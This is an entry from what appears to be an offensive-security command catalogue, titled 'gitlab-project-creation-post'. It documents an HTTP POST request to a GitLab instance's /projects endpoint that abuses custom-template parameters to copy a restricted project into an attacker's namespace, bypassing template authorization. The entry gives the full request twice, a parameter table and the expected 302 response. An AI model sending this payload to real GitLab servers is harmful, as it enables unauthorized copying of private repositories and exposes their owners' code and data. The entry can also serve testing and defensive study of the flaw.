---
data: >-
  POST /projects HTTP/1.1

  Host: instance

  Content-Type: application/x-www-form-urlencoded


  project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1&project[name]=new_project&project[path]=new_project&project[namespace_id]=attacker_namespace_id
tags:
  - http
  - gitlab
type: command
executor: http
platforms:
  - Web
id: b4e7b64b-a7aa-40a5-b9ec-cd8cc452e6b8
created_at: '2025-12-11T06:10:15.853Z'
updated_at: '2025-12-11T06:10:15.853Z'
verified: false
validated: true
submitted: true
---
# gitlab-project-creation-post

## Command

```http
POST /projects HTTP/1.1
Host: instance
Content-Type: application/x-www-form-urlencoded

project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1&project[name]=new_project&project[path]=new_project&project[namespace_id]=attacker_namespace_id
```

## Description

This HTTP POST request is used to create a new GitLab project while bypassing template authorization by setting custom parameters to reference a restricted project.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `project[use_custom_template]` | Enables custom template usage | Yes |
| `project[template_name]` | Name of the target project to copy | Yes |
| `project[group_with_project_templates_id]` | ID of the group containing the target | Yes |
| `project[name]` | Name of the new project | Yes |
| `project[path]` | Path of the new project | Yes |
| `project[namespace_id]` | Attacker's namespace ID | Yes |

## Examples

### Basic Usage

```http
POST /projects HTTP/1.1
Host: instance
Content-Type: application/x-www-form-urlencoded

project[use_custom_template]=true&project[template_name]=test_project&project[group_with_project_templates_id]=1&project[name]=new_project&project[path]=new_project&project[namespace_id]=5
```

### Advanced Usage

Add additional headers if needed for authentication.

## Expected Output

Server responds with a 302 redirect to the import progress page, indicating the job has been queued.

## Related

- [[procedures/Intercept-and-Modify-GitLab-Project-Creation-Request]]
- [[tools/HTTP-Proxy]]
